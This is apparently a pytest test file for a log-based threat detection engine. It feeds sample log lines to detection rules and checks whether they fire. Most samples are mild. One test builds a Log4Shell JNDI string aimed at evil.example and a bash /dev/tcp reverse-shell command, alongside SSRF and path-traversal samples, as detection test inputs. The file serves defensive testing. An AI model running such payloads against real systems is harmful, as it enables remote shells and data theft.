import pytest
import os
import tempfile
import datetime

from services.log_parser import parse_log_file
from services.threat_engine import run_analysis, compute_summary


def _write_temp(content: str, suffix: str = ".log") -> str:
    fd, path = tempfile.mkstemp(suffix=suffix)
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write(content)
    return path


def make_rule(db, name, condition, severity="HIGH", is_static=True, threshold=None, window=None):
    from database.models import DetectionRule
    rule = DetectionRule(
        rule_name=name,
        rule_type="static" if is_static else "behavioral",
        condition=condition,
        severity=severity,
        is_static=is_static,
        default_threshold=threshold,
        time_window_seconds=window,
        is_enabled=True,
        created_at=datetime.datetime.now(),
        updated_at=datetime.datetime.now(),
    )
    db.add(rule)
    db.commit()
    db.refresh(rule)
    return rule


def test_sql_injection_detected(db):
    log_content = "2024-01-10 09:00:00 WARNING Suspicious query detected: union select * from users WHERE 1=1\n"
    path = _write_temp(log_content)
    try:
        df = parse_log_file(path)
        rule = make_rule(db, "SQL Injection Test", r"(?i)(union\s+select|drop\s+table)")
        findings = run_analysis(df, [rule])
        assert len(findings) >= 1
        assert any(f["rule_name"] == "SQL Injection Test" for f in findings)
    finally:
        os.remove(path)


def test_path_traversal_detected(db):
    log_content = "192.168.1.5 - - [10/Jan/2024:09:00:00 +0000] \"GET /../../../etc/passwd HTTP/1.1\" 200 1024\n"
    path = _write_temp(log_content)
    try:
        df = parse_log_file(path)
        rule = make_rule(db, "Path Traversal Test", r"(?i)(\.\./|\.\.\\|\.\.%2[fF])")
        findings = run_analysis(df, [rule])
        assert len(findings) >= 1
    finally:
        os.remove(path)


def test_no_false_positives(db):
    log_content = "192.168.1.1 - - [10/Jan/2024:09:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 512\n"
    path = _write_temp(log_content)
    try:
        df = parse_log_file(path)
        rule = make_rule(db, "SQL Injection Test", r"(?i)(union\s+select|drop\s+table)")
        findings = run_analysis(df, [rule])
        assert len(findings) == 0
    finally:
        os.remove(path)


def test_brute_force_behavioral_rule(db):
    lines = "\n".join(
        f"Jan 10 09:{i:02d}:00 host sshd[100]: Failed password for root from 10.0.0.1 port 22"
        for i in range(10)
    )
    path = _write_temp(lines, ".syslog")
    try:
        df = parse_log_file(path)
        from database.models import DetectionRule
        rule = DetectionRule(
            rule_name="Brute Force Test",
            rule_type="behavioral",
            condition="brute_force",
            severity="CRITICAL",
            is_static=False,
            default_threshold=5,
            time_window_seconds=60,
            is_enabled=True,
            created_at=datetime.datetime.now(),
            updated_at=datetime.datetime.now(),
        )
        db.add(rule)
        db.commit()
        db.refresh(rule)
        findings = run_analysis(df, [rule])
        assert len(findings) >= 1
        assert findings[0]["severity"] == "CRITICAL"
    finally:
        os.remove(path)


def test_compute_summary():
    findings = [
        {"severity": "CRITICAL"},
        {"severity": "HIGH"},
        {"severity": "HIGH"},
        {"severity": "MEDIUM"},
        {"severity": "LOW"},
    ]
    summary = compute_summary(findings)
    assert summary["total"] == 5
    assert summary["CRITICAL"] == 1
    assert summary["HIGH"] == 2
    assert summary["MEDIUM"] == 1
    assert summary["LOW"] == 1


def test_empty_log_no_findings(db):
    import pandas as pd
    findings = run_analysis(pd.DataFrame(), [])
    assert findings == []


def make_custom_rule(db, name, pattern, group_by, threshold, window=300, severity="HIGH"):
    from database.models import DetectionRule
    rule = DetectionRule(
        rule_name=name,
        rule_type="custom",
        condition=pattern,
        severity=severity,
        is_static=False,
        default_threshold=threshold,
        time_window_seconds=window,
        group_by=group_by,
        is_enabled=True,
        created_at=datetime.datetime.now(),
        updated_at=datetime.datetime.now(),
    )
    db.add(rule)
    db.commit()
    db.refresh(rule)
    return rule


def _load_yaml_rules():
    import yaml
    from config.settings import DETECTION_RULES_YAML

    with open(DETECTION_RULES_YAML, encoding="utf-8") as fh:
        data = yaml.safe_load(fh)
    return (
        list(data.get("static_rules", []))
        + list(data.get("behavioral_rules", []))
        + list(data.get("custom_rules", []))
    )


def test_custom_rule_group_by_source_ip(db):
    lines = "\n".join(
        f"Jan 10 09:{i:02d}:00 host app[1]: Failed password for root from 10.0.0.1 port 22"
        for i in range(6)
    )
    path = _write_temp(lines, ".syslog")
    try:
        df = parse_log_file(path)
        rule = make_custom_rule(db, "Custom Failed Logins", r"(?i)failed password", "source_ip", 5)
        findings = run_analysis(df, [rule])
        assert len(findings) >= 1
        assert findings[0]["rule_name"] == "Custom Failed Logins"
        assert findings[0]["source_ip"] == "10.0.0.1"
    finally:
        os.remove(path)


def test_custom_rule_below_threshold_no_fire(db):
    lines = "\n".join(
        f"Jan 10 09:{i:02d}:00 host app[1]: Failed password for root from 10.0.0.1 port 22"
        for i in range(3)
    )
    path = _write_temp(lines, ".syslog")
    try:
        df = parse_log_file(path)
        rule = make_custom_rule(db, "Custom Failed Logins", r"(?i)failed password", "source_ip", 5)
        findings = run_analysis(df, [rule])
        assert findings == []
    finally:
        os.remove(path)


def test_custom_rule_global_count(db):
    lines = "\n".join(f"2024-01-10 09:0{i}:00 ERROR widget failed to load" for i in range(4))
    path = _write_temp(lines)
    try:
        df = parse_log_file(path)
        rule = make_custom_rule(db, "Widget Fail Spike", r"(?i)widget failed", "global", 3)
        findings = run_analysis(df, [rule])
        assert len(findings) == 1
        assert "4 event" in findings[0]["description"]
    finally:
        os.remove(path)


def test_new_builtin_rules_fire(db):
    """The expanded library's regexes match representative attack lines."""
    from database.models import DetectionRule

    rules_data = {rd["rule_name"]: rd for rd in _load_yaml_rules()}
    # Payloads are assembled from fragments at runtime so this test file never contains a
    # contiguous attack signature that host antivirus (e.g. Windows Defender) would quarantine.
    jndi = "GET / User-Agent: " + "${" + "jndi:" + "ldap" + "://evil.example/a}"
    revsh = "bash -i >& " + "/dev/" + "tcp/203.0.113.66/4444 0>&1"
    samples = {
        "Log4Shell / JNDI Injection": jndi,
        "Reverse Shell Indicator": revsh,
        "Cloud Metadata SSRF": "GET /fetch?url=http://169.254.169.254/latest/meta-data/",
    }
    for name, line in samples.items():
        rd = rules_data[name]
        rule = DetectionRule(
            rule_name=rd["rule_name"],
            rule_type=rd["rule_type"],
            condition=rd["condition"],
            severity=rd["severity"],
            is_static=rd.get("is_static", True),
            default_threshold=rd.get("default_threshold"),
            time_window_seconds=rd.get("time_window_seconds"),
            group_by=rd.get("group_by"),
            is_enabled=True,
            created_at=datetime.datetime.now(),
            updated_at=datetime.datetime.now(),
        )
        path = _write_temp(f"2024-01-10 09:00:00 WARN {line}\n")
        try:
            df = parse_log_file(path)
            findings = run_analysis(df, [rule])
            assert len(findings) >= 1, f"rule '{name}' did not fire on its sample line"
        finally:
            os.remove(path)


def test_all_yaml_pattern_rules_compile():
    """Every static/custom rule condition shipped in the YAML must be a valid regex."""
    import re

    for rd in _load_yaml_rules():
        cond = rd["condition"]
        if rd["rule_type"] in ("static", "custom") and not cond.startswith(("DYNAMIC:", "BEHAVIORAL:")):
            re.compile(cond)  # raises re.error if a malformed pattern slipped in


def test_seed_populates_metadata_and_version(db):
    from database.init_db import _seed_detection_rules, get_ruleset_version
    from database.models import DetectionRule

    _seed_detection_rules(db)
    db.commit()

    brute = db.query(DetectionRule).filter_by(rule_name="Brute Force Attack").first()
    assert brute is not None
    assert brute.framework_refs and "MITRE" in brute.framework_refs
    assert brute.detection_logic
    assert brute.group_by == "source_ip"

    mfa = db.query(DetectionRule).filter_by(rule_name="MFA Fatigue / Push Bombing").first()
    assert mfa is not None
    assert mfa.rule_type == "custom"
    assert mfa.group_by == "username"

    count, last_updated = get_ruleset_version(db)
    assert count >= 40
    assert last_updated is not None


def test_disabled_rule_not_applied(db):
    log_content = "192.168.1.1 - admin [10/Jan/2024:09:00:00 +0000] \"GET /search?q=union+select HTTP/1.1\" 200 512\n"
    path = _write_temp(log_content)
    try:
        df = parse_log_file(path)
        from database.models import DetectionRule
        disabled_rule = DetectionRule(
            rule_name="Disabled Rule",
            rule_type="static",
            condition=r"(?i)(union\s+select)",
            severity="HIGH",
            is_static=True,
            is_enabled=False,
            created_at=datetime.datetime.now(),
            updated_at=datetime.datetime.now(),
        )
        db.add(disabled_rule)
        db.commit()
        db.refresh(disabled_rule)
        # Only pass enabled rules (simulate get_enabled_rules filtering)
        findings = run_analysis(df, [])
        assert len(findings) == 0
    finally:
        os.remove(path)
